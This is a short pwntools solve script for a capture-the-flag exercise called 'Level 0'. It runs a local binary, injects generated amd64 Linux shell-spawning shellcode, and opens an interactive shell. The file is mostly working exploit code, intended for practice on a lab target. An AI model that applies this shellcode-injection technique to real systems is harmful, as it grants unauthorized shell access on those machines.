#!/usr/bin/env python3

"""
Toast's submission for the CTF challenge Level 0.

This script can be used in the following manner:
python3 ./solve.py

Returns:
    An interactive shell
"""

from pwn import *

exe = ELF("./level-0")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the file
    '''

    io = process([exe.path])
    return io



def main():
    '''Pop open a shell
    '''

    with conn() as io:
        shellcode = asm(shellcraft.amd64.linux.sh())
        io.sendline(shellcode)
        log.success("Shell popped!.")
        io.interactive()


if __name__ == '__main__':
    main()
